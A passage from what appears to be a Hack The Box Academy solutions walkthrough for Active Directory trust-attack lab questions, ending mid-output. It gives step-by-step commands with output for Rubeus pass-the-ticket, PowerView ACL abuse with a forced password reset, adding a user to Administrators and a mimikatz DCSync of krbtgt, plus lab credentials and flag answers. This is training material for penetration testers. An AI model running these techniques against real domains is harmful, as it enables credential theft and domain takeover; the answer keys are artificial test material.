After spawning the target, students need to connect via SSH and establish a dynamic port forwarding with the credentials `Administrator:Test@123`:

Code: shell

```shell
ssh -D 9050 Administrator@STMIP
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-ppkmthk6c0]─[~]
└──╼ [★]$ ssh -D 9050 Administrator@10.129.229.204

The authenticity of host '10.129.229.204 (10.129.229.204)' can't be established.
ECDSA key fingerprint is SHA256:ymhpv5dvyTmqO+Iq4zNh/Q4bdf6z9s9uA/ZofCP/fBs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.229.204' (ECDSA) to the list of known hosts.
Administrator@10.129.229.204's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

administrator@SQL01 C:\Users\Administrator>
```

Subsequently, they need to connect via RDP to `DC01.inlanfreight.ad` (`172.16.118.3`) with the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-ppkmthk6c0]─[~]
└──╼ [★]$ proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution

[10:16:52:362] [3948:3950] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[10:16:52:362] [3948:3950] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[10:16:52:362] [3948:3950] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[10:16:52:537] [3948:3950] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[10:16:52:537] [3948:3950] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.ad
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.16.118.3:3389) 
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - Common Name (CN):
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - 	DC01.inlanefreight.ad
[10:16:52:537] [3948:3950] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.118.3:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.ad
	Subject:     CN = DC01.inlanefreight.ad
	Issuer:      CN = DC01.inlanefreight.ad
	Thumbprint:  4f:08:98:37:cd:0c:b7:af:7e:30:a9:82:b8:21:29:e1:eb:a1:fb:85:7a:ea:50:76:da:fe:d5:d1:9b:b7:c7:b0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Right after establishing an RDP session, students need to open `PowerShell`, navigate to `C:\Tools`, import `PowerView.ps1`, and query the `logistics.ad` domain using `Get-DomainObject` alongside LDAP filters to discover attributes that have the `ForeignSecurityPrincipal` attribute and convert the SID to find out the user who has that kind of attribute:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
Get-DomainObject -LDAPFilter '(objectClass=ForeignSecurityPrincipal)' -Domain logistics.ad
ConvertFrom-SID S-1-5-21-2432454459-173448545-3375717855-3601
```

```
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainObject -LDAPFilter '(objectClass=ForeignSecurityPrincipal)' -Domain logistics.ad

<SNIP>

objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=logistics,DC=ad
cn                     : S-1-5-21-2432454459-173448545-3375717855-3601
objectguid             : 54ecf3a2-820c-4495-9790-8dd884db3ecf
name                   : S-1-5-21-2432454459-173448545-3375717855-3601
distinguishedname      : CN=S-1-5-21-2432454459-173448545-3375717855-3601,CN=ForeignSecurityPrincipals,DC=logis
                         ad
showinadvancedviewonly : True

PS C:\Tools> ConvertFrom-SID S-1-5-21-2432454459-173448545-3375717855-3601
INLANEFREIGHT\harry
```

Consequently, students will have to query the domain for foreign users using `Get-DomainForeignGroupMember` to verify that the user `harry` is part of foreign users and groups:

Code: powershell

```powershell
Get-DomainForeignGroupMember -Domain logistics.ad
```

```
PS C:\Tools> Get-DomainForeignGroupMember -Domain logistics.ad

GroupDomain             : logistics.ad
GroupName               : svc_admins
GroupDistinguishedName  : CN=svc_admins,CN=Users,DC=logistics,DC=ad
MemberDomain            : logistics.ad
MemberName              : S-1-5-21-2432454459-173448545-3375717855-3601
MemberDistinguishedName : CN=S-1-5-21-2432454459-173448545-3375717855-3601,CN=ForeignSecurityPrincipals,DC=logistics,DC=ad
```

They will have to utilize `Rubeus.exe` to request a ticket-granting ticket (TGT) for the user `harry` with the password `Password123` and import the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:harry /password:Password123 /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /user:harry /password:Password123 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 58A478135A93AC3BF058A5EA0E8FDB71
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.ad\harry'
[*] Using domain controller: fe80::e1a4:a2c7:1f35:c7bf%6:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFHDCCBRigAwIBBaEDAgEWooIEKDCCBCRhggQgMIIEHKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi
      
<SNIP>
      
QU5FRlJFSUdIVC5BRKklMCOgAwIBAqEcMBobBmtyYnRndBsQaW5sYW5lZnJlaWdodC5hZA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.ad
  ServiceRealm             :  INLANEFREIGHT.AD
  UserName                 :  harry
  UserRealm                :  INLANEFREIGHT.AD
  StartTime                :  4/29/2024 2:28:31 AM
  EndTime                  :  4/29/2024 12:28:31 PM
  RenewTill                :  5/6/2024 2:28:31 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  EUcOKB6OPFxN8jF7uxXXcw==
  ASREP (key)              :  58A478135A93AC3BF058A5EA0E8FDB71
```

With the imported ticket, they can proceed to grab the flag.

Code: powershell

```powershell
type \\DC02.logistics.ad\FSP_Flag\flag.txt
```

```
PS C:\Tools> type \\DC02.logistics.ad\FSP_Flag\flag.txt

HTB{FSP_ABU53_F0r_FUN}
```

Answer: `HTB{FSP_ABU53_F0r_FUN}`

# Abusing Foreign Security Principals & ACLs

## Question 2

### "Authenticate to DC01.inlanefreight.ad (172.16.118.3) and abuse the foreign ACLs of the user "ava". What is the flag value located at "\\\\DC02.logistics.ad\\FSP\_ACL\\flag.txt"? (The flag is accessible by the user "logistics\\jessica")"

Using the previously established RDP session, students will have to request a ticket-granting ticket (TGT) for the user `ava` with the password `ava` and import the ticket into memory.

```
PS C:\Tools> .\Rubeus.exe asktgt /user:ava /password:ava /domain:inlanefreight.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: AAF30E80762D7401C10D84BBF9B845B4
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.ad\ava'
[*] Using domain controller: fe80::e1a4:a2c7:1f35:c7bf%6:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFADCCBPygAwIBBaEDAgEWooIEDjCCBAphggQGMIIEAqADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi

<SNIP>

a3JidGd0GxBpbmxhbmVmcmVpZ2h0LmFk
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.ad
  ServiceRealm             :  INLANEFREIGHT.AD
  UserName                 :  ava
  UserRealm                :  INLANEFREIGHT.AD
  StartTime                :  4/29/2024 2:32:39 AM
  EndTime                  :  4/29/2024 12:32:39 PM
  RenewTill                :  5/6/2024 2:32:39 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  t18RQnpXPV6yc8hvLOCcaw==
  ASREP (key)              :  AAF30E80762D7401C10D84BBF9B845B4
```

Subsequently, they will utilize `Get-DomainObjectAcl` to query the users on which `ava` has `GenericAll` or other permissions, where they will come to know that `ava` has `GenericAll` permission over the user `jessica`:

Code: powershell

```powershell
$sid = Convert-NameToSid ava
Get-DomainObjectAcl -ResolveGUIDs -Identity * -Domain logistics.ad | ? {$_.SecurityIdentifier -eq $sid}
```

```
PS C:\Tools> $sid = Convert-NameToSid ava
PS C:\Tools> Get-DomainObjectAcl -ResolveGUIDs -Identity * -Domain logistics.ad | ? {$_.SecurityIdentifier -eq $sid}

AceType               : AccessAllowed
ObjectDN              : CN=jessica,CN=Users,DC=logistics,DC=ad
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-186204973-2882451676-2899969076-6601
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2432454459-173448545-3375717855-5601
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

With the obtained information thus far, students will proceed to change the password of the user `jessica` using `Set-DomainUserPassword` cmdlet.

Code: powershell

```powershell
$pass = ConvertTo-SecureString 'Ac@demy123' -AsPlainText -Force
Set-DomainUserPassword -Identity jessica -AccountPassword $pass -Domain logistics.ad -verbose
```

```
PS C:\Tools> $pass = ConvertTo-SecureString 'Ac@demy123' -AsPlainText -Force
PS C:\Tools> Set-DomainUserPassword -Identity jessica -AccountPassword $pass -Domain logistics.ad -verbose

VERBOSE: [Get-PrincipalContext] Binding to domain 'logistics.ad'
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'jessica'
VERBOSE: [Set-DomainUserPassword] Password for user 'jessica' successfully reset
```

They will proceed to request a ticket-granting ticket (TGT) using `Rubeus.exe` for the user `jessica` with the new password and import the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:jessica /password:'Ac@demy123' /domain:logistics.ad /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /user:jessica /password:'Ac@demy123' /domain:logistics.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 863EAD83343E2C19BC4F68C0380DDD41
[*] Building AS-REQ (w/ preauth) for: 'logistics.ad\jessica'
[*] Using domain controller: 172.16.118.252:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE+DCCBPSgAwIBBaEDAgEWooIEDjCCBAphggQGMIIEAqADAgEFoQ4bDExPR0lTVElDUy5BRKIhMB+g

<SNIP>

Z3QbDGxvZ2lzdGljcy5hZA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/logistics.ad
  ServiceRealm             :  LOGISTICS.AD
  UserName                 :  jessica
  UserRealm                :  LOGISTICS.AD
  StartTime                :  4/29/2024 2:41:39 AM
  EndTime                  :  4/29/2024 12:41:39 PM
  RenewTill                :  5/6/2024 2:41:39 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Ogo20tWcRB/8QT88Xqkaug==
  ASREP (key)              :  863EAD83343E2C19BC4F68C0380DDD41
```

With the imported ticket in memory, students can proceed to grab the flag.

Code: powershell

```powershell
type \\DC02.logistics.ad\FSP_ACL\flag.txt
```

```
PS C:\Tools> type \\DC02.logistics.ad\FSP_ACL\flag.txt

HTB{FSP_AC1s_Ar3_FuN}
```

Answer: `HTB{FSP_AC1s_Ar3_FuN}`

# Abusing PAM Trusts

## Question 1

### "Perform PAM Trust abuse and get the flag value located at "C:\\Users\\Administrator\\Desktop\\flag.txt"."

After spawning the target, students need to connect to it using RDP with the credentials `Administrator:C0ntrol_center_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'C0ntrol_center_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-royrpsroup]─[~]
└──╼ [★]$ xfreerdp /v:10.129.229.205 /u:Administrator /p:'C0ntrol_center_adm!' /dynamic-resolution 

[14:00:42:945] [3593:3594] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[14:00:42:946] [3593:3594] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[14:00:42:946] [3593:3594] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[14:00:42:130] [3593:3594] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[14:00:42:130] [3593:3594] [WARN][com.freerdp.crypto] - CN = DC01.controlcenter.corp
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.229.205:3389) 
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - Common Name (CN):
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - 	DC01.controlcenter.corp
[14:00:42:131] [3593:3594] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.229.205:3389 (RDP-Server):
	Common Name: DC01.controlcenter.corp
	Subject:     CN = DC01.controlcenter.corp
	Issuer:      CN = DC01.controlcenter.corp
	Thumbprint:  f0:e0:ab:b1:8e:2a:4d:14:1c:1e:dd:b6:9f:5f:7b:ba:dc:fe:8f:f5:7d:5e:9d:b7:bb:7b:ca:f3:72:b3:1e:34
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

They will have to switch to PowerShell and use the `Get-ADObject` cmdlet to enumerate for shadow principals.

Code: powershell

```powershell
powershell
Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

```
C:\Users\Administrator>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator> Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl

Name                    : Shadow Principal Configuration
member                  : {}
msDS-ShadowPrincipalSid :

Name                    : Tom
member                  : {CN=Administrator,CN=Users,DC=controlcenter,DC=corp}
msDS-ShadowPrincipalSid : S-1-5-21-3549861696-4008919250-3337133846-519
```

With the attained information, students will verify that the user `Tom` has the `Shadow Principal Configuration` assigned, consequently they will attain the flag `HTB{P4M_Trust_Abuse}` when reading the file contents at `\\DC-EU.eulogistics.corp\c$\Users\Administrator\Desktop\flag.txt`:

Code: powershell

```powershell
type \\DC-EU.eulogistics.corp\c$\Users\Administrator\Desktop\flag.txt
```

```
PS C:\Users\Administrator> type \\DC-EU.eulogistics.corp\c$\Users\Administrator\Desktop\flag.txt

HTB{P4M_Trust_Abuse}
```

Answer: `HTB{P4M_Trust_Abuse}`

# Active Directory Trust Attacks - Skills Assessment

## Question 1

### "Gain access to the "Inlanefreight.ad" domain and submit the contents of the flag located in "C:\\Users\\Administrator\\Desktop\\flag.txt""

After spawning the target, students need to connect via RDP with the credentials `htb-student:HTB_@cademy_stdnt`, while additionally mounting their current working directory which will be used to transfer files between the target machine and their workstations.

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:'HTB_@cademy_stdnt' /dynamic-resolution /drive:.,academy
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-3ni6bv0mfs]─[~]
└──╼ [★]$ xfreerdp /v:10.129.240.7 /u:htb-student /p:'HTB_@cademy_stdnt' /dynamic-resolution /drive:.,academy

[13:23:25:217] [3638:3639] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[13:23:25:217] [3638:3639] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[13:23:25:217] [3638:3639] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[13:23:25:406] [3638:3639] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[13:23:25:406] [3638:3639] [WARN][com.freerdp.crypto] - CN = CHILD-DC.child.inlanefreight.ad
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.240.7:3389) 
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - Common Name (CN):
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - 	CHILD-DC.child.inlanefreight.ad
[13:23:25:406] [3638:3639] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.240.7:3389 (RDP-Server):
	Common Name: CHILD-DC.child.inlanefreight.ad
	Subject:     CN = CHILD-DC.child.inlanefreight.ad
	Issuer:      CN = CHILD-DC.child.inlanefreight.ad
	Thumbprint:  97:36:93:e8:71:69:1a:6b:e9:e8:3a:3d:0b:3e:2e:f5:cf:de:97:37:d9:9c:31:45:cc:93:9c:33:ed:24:8b:d8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
```

Right after, they will have to download [PowerView.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) from the official GitHub repository.

Code: shell

```shell
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-icg935se5l]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
--2024-04-30 06:38:37--  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 770279 (752K) [text/plain]
Saving to: ‘PowerView.ps1’

PowerView.ps1       100%[===================>] 752.23K  --.-KB/s    in 0.007s  

2024-04-30 06:38:37 (108 MB/s) - ‘PowerView.ps1’ saved [770279/770279]
```

With the obtained PowerShell script, students need to return to the RDP session, open PowerShell, and copy the file to their current working directories.

Code: powershell

```powershell
net use
copy \\TSCLIENT\academy\PowerView.ps1 .
```

```
PS C:\Users\htb-student> net use
New connections will be remembered.

Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\academy        Microsoft Terminal Services
The command completed successfully.

PS C:\Users\htb-student> copy \\TSCLIENT\academy\PowerView.ps1 .
```

Subsequently, students need to import `PowerView.ps1` and run `Get-DomainForeignUser`, `Get-DomainForeignGroupMember` while targeting the `inlanefreight.ad` domain.

Code: powershell

```powershell
Import-Module .\PowerView.ps1
Get-DomainForeignUser
Get-DomainForeignGroupMember -Domain "inlanefreight.ad"
```

```
PS C:\Users\htb-student> Import-Module .\PowerView.ps1
PS C:\Users\htb-student> Get-DomainForeignUser

UserDomain             : child.inlanefreight.ad
UserName               : htb-student
UserDistinguishedName  : CN=htb-student,CN=Users,DC=child,DC=inlanefreight,DC=ad
GroupDomain            : inlanefreight.ad
GroupName              : Svc_Admins
GroupDistinguishedName : CN=Svc_Admins,CN=Users,DC=inlanefreight,DC=ad

PS C:\Users\htb-student> Get-DomainForeignGroupMember -Domain "inlanefreight.ad"

GroupDomain             : inlanefreight.ad
GroupName               : Svc_Admins
GroupDistinguishedName  : CN=Svc_Admins,CN=Users,DC=inlanefreight,DC=ad
MemberDomain            : child.inlanefreight.ad
MemberName              : htb-student
MemberDistinguishedName : CN=htb-student,CN=Users,DC=child,DC=inlanefreight,DC=ad
```

Consequently, they will come to know that the user `htb-student` is a foreign user who is part of the `Svc_Admins` group. Running `SharpHound` by targeting both of the domains `child.inlanefreight.ad` and `inlanefreight.ad`, students will import the data in the form of ZIP archives in BloodHound, where they will find out that the user `htb-student` and the group he is part of (`Svc_Admins`) can modify the `Administrators` group on the `inlanfreight.ad` domain due to the `GenericAll` permissions.

![[HTB Solutions/CPTS/z. images/b1377d1fc98916e3a745271b77fd57cc_MD5.jpg]]

With the obtained information, students will proceed to add the user `htb-student` to the `Administrators@INLANEFREIGHT.AD` group using the `Add-DomainGroupMember` cmdlet.

Code: powershell

```powershell
Add-DomainGroupMember -Identity "Administrators" -Members 'CHILD\htb-student' -Domain inlanefreight.ad -Verbose
```

```
PS C:\Users\htb-student> Add-DomainGroupMember -Identity "Administrators" -Members 'CHILD\htb-student' -Domain inlanefreight.ad -Verbose

VERBOSE: [Get-PrincipalContext] Binding to domain 'inlanefreight.ad'
VERBOSE: [Get-PrincipalContext] Binding to domain 'child.inlanefreight.ad'
VERBOSE: [Add-DomainGroupMember] Adding member 'CHILD\htb-student' to group 'Administrators'
```

Students will proceed to confirm that the `htb-student` user has been successfully added to the `Administrators` group in the `inlanefreight.ad` domain utilizing the `Get-DomainGroup` cmdlet.

Code: powershell

```powershell
Get-DomainGroup "Administrators" -Domain inlanefreight.ad -Properties member
```

```
PS C:\Users\htb-student> Get-DomainGroup "Administrators" -Domain inlanefreight.ad -Properties member

member
------
{CN=Managers,CN=Users,DC=inlanefreight,DC=ad, CN=htb-student,CN=Users,DC=child,DC=inlanefreight,DC=ad, CN=Domain Adm...
```

Subsequently, students will obtain the flag `HTB{AD_F0rest_Trust}` when reading the file contents at `\\DC.inlanefreight.ad\C$\Users\Administrator\Desktop\flag.txt`:

Code: powershell

```powershell
type \\DC.inlanefreight.ad\C$\Users\Administrator\Desktop\flag.txt
```

```
PS C:\Users\htb-student> type \\DC.inlanefreight.ad\C$\Users\Administrator\Desktop\flag.txt

HTB{AD_F0rest_Trust}
```

Answer: `HTB{AD_F0rest_Trust}`

# Active Directory Trust Attacks - Skills Assessment

## Question 2

### "Gain access to the DC03 (Apexcargo.ad) and submit the contents of the flag located in "C:\\Users\\Administrator\\Desktop\\flag.txt""

With the previously established RDP session, students will proceed to enumerate the trusts that the domain `inlanfreight.ad` coming to know that the trust between `apexcargo.ad` and `inlanfreight.ad` is `bidirectional`:

Code: powershell

```powershell
Get-DomainTrust -Domain inlanefreight.ad
```

```
PS C:\Users\htb-student> Get-DomainTrust -Domain inlanefreight.ad

<SNIP>

SourceName      : inlanefreight.ad
TargetName      : apexcargo.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 4/1/2024 3:53:05 PM
WhenChanged     : 4/2/2024 10:38:50 AM
```

With the obtained information about the direction of trust, students will proceed to enumerate the `TrustAttributes` to verify if the `SID History` is enabled within the domain between `apexcargo.ad` and `inlanfreight.ad`:

Code: powershell

```powershell
Get-DomainTrust -domain apexcargo.ad | Where-Object {$_.TargetName -eq "inlanefreight.ad"} | select TrustAttributes
```

```
PS C:\Users\htb-student> Get-DomainTrust -domain apexcargo.ad | Where-Object {$_.TargetName -eq "inlanefreight.ad"} | select TrustAttributes

TrustAttributes
---------------
TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
```

Students therefore will proceed to enumerate the groups in the `apexcargo.ad` domain using the `Get-DomainGroup` cmdlet coming across the `HR_Management` group having `DCSync` privileges.

Code: powershell

```powershell
Get-DomainGroup -Domain apexcargo.ad
```

```
PS C:\Users\htb-student> Get-DomainGroup -Domain apexcargo.ad

<SNIP>

usncreated            : 20577
admincount            : 1
grouptype             : UNIVERSAL_SCOPE, SECURITY
samaccounttype        : GROUP_OBJECT
samaccountname        : HR_Management
whenchanged           : 4/8/2024 6:09:15 PM
objectsid             : S-1-5-21-990245489-431684941-3923950027-1112
objectclass           : {top, group}
cn                    : HR_Management
usnchanged            : 73770
dscorepropagationdata : {4/30/2024 7:39:14 AM, 4/30/2024 7:37:15 AM, 4/30/2024 7:35:15 AM, 4/30/2024 7:33:15 AM...}
name                  : HR_Management
distinguishedname     : CN=HR_Management,CN=Users,DC=apexcargo,DC=ad
whencreated           : 4/1/2024 4:17:01 PM
instancetype          : 4
objectguid            : d3a49e61-3516-4708-b3af-9c0f98ee1778
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=apexcargo,DC=ad
```

![[HTB Solutions/CPTS/z. images/896c4786c5e1494d5d3f14cf3624c45d_MD5.jpg]]

With that information, students will proceed to perform a `SID History Injection Attack`. They will have to transfer `mimikatz.exe` to the target machine and proceed to perform a DCSync attack targeting the `krbtgt` user.

Code: powershell

```powershell
copy \\TSCLIENT\academy\mimikatz.exe
.\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt /domain:inlanefreight.ad" exit
```

```
PS C:\Users\htb-student> copy \\TSCLIENT\academy\mimikatz.exe
PS C:\Users\htb-student> .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt /domain:inlanefreight.ad" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:INLANEFREIGHT\krbtgt /domain:inlanefreight.ad
[DC] 'inlanefreight.ad' will be the domain
[DC] 'DC.inlanefreight.ad' will be the DC server
[DC] 'INLANEFREIGHT\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 3/30/2024 10:42:23 PM
Object Security ID   : S-1-5-21-1407615112-106284543-3058975305-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 6f639a6054a3d9852409e9ad7e41893b
    ntlm- 0: 6f639a6054a3d9852409e9ad7e41893b
    lm  - 0: 27d88160e6b172196deac2bb5205e74c
<SNIP>
```

Students will have to get the domain SID (security identifier) of `inlanefreight.ad` and the SID of the `HR_Management` group.

Code: powershell

```powershell
Get-DomainSID -Domain inlanefreight.ad
Get-ADGroup -Identity "HR_MANAGEMENT" -Server apexcargo.ad
```

```
PS C:\Users\htb-student> Get-DomainSID -Domain inlanefreight.ad

S-1-5-21-1407615112-106284543-3058975305

PS C:\Users\htb-student> Get-ADGroup -Identity "HR_MANAGEMENT" -Server apexcargo.ad

DistinguishedName : CN=HR_Management,CN=Users,DC=apexcargo,DC=ad
GroupCategory     : Security
GroupScope        : Universal
Name              : HR_Management
ObjectClass       : group
ObjectGUID        : d3a49e61-3516-4708-b3af-9c0f98ee1778
SamAccountName    : HR_Management
